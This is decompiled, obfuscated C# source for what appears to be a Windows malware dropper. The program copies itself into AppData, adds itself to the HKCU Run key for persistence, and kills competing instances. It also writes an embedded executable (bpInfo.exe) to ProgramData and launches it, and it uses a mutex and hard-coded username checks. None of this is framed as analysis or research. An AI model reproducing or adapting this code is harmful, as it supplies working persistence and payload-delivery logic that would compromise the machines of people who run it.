using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal static class Class5
{
	private static bool bool_0 = false;

	private static string string_0 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Application");

	private static string[] string_1 = new string[2] { "mauricio.weber", "mauricio" };

	private static string String_0 => Path.Combine(string_0, "mtrl.exe");

	private static string String_1 => Path.Combine(string_0, "BrowserFileFlag");

	[STAThread]
	private static void Main()
	{
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		if (!File.Exists(String_1))
		{
			smethod_2();
		}
		if (smethod_0())
		{
			smethod_1();
		}
		else if (string.Compare(Application.get_ExecutablePath(), String_0, ignoreCase: true) != 0)
		{
			Process.GetCurrentProcess().Kill();
		}
		using Mutex mutex = new Mutex(initiallyOwned: false, "Global\\MtrlUsingMutex");
		if (!mutex.WaitOne(0, exitContext: false))
		{
			if (bool_0)
			{
				MessageBox.Show("Usuário sem acesso.", "Atenção", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			Process.GetCurrentProcess().Kill();
		}
		new GClass6();
	}

	private static bool smethod_0()
	{
		string empty = string.Empty;
		try
		{
			empty = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")!.GetValue("MTrl")!.ToString();
		}
		catch
		{
			return true;
		}
		string[] array = empty.Split(new char[1] { '"' });
		if (!File.Exists(array[1]))
		{
			return true;
		}
		FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(String_0);
		Version version = new Version(versionInfo.ProductVersion);
		Version version2 = new Version(Application.get_ProductVersion());
		return version < version2;
	}

	private static void smethod_1()
	{
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (process.MainModule!.FileName == String_0)
				{
					try
					{
						process.Kill();
					}
					catch
					{
						GClass2.smethod_4(Path.GetFileName(String_0));
					}
					break;
				}
			}
			catch
			{
			}
		}
		if (!Directory.Exists(string_0))
		{
			Directory.CreateDirectory(string_0);
		}
		Thread.Sleep(1000);
		try
		{
			File.Copy(Application.get_ExecutablePath(), String_0, overwrite: true);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("MTrl", "\"" + String_0 + "\"");
			if (bool_0)
			{
				MessageBox.Show("Usuário sem acesso.", "Atenção", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			new GClass5().method_1();
			Process.Start(String_0);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
		}
	}

	private static void smethod_2()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "bpInfo.exe");
			if (File.Exists(text))
			{
				GClass2.smethod_4("bpInfo.exe");
				GClass2.smethod_0(text);
			}
			using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("mtrl.bpInfo.exe"))
			{
				using FileStream fileStream = new FileStream(text, FileMode.Create);
				byte[] array = new byte[stream.Length];
				stream.Read(array, 0, array.Length);
				fileStream.Write(array, 0, array.Length);
			}
			Process.Start(text, GClass9.String_1);
			using StreamWriter streamWriter = new StreamWriter(String_1);
			streamWriter.Write("");
		}
		catch
		{
		}
	}

	public static bool smethod_3()
	{
		string[] array = string_1;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				string strB = array[num];
				if (string.Compare(Environment.UserName, strB, ignoreCase: true) == 0)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}
}
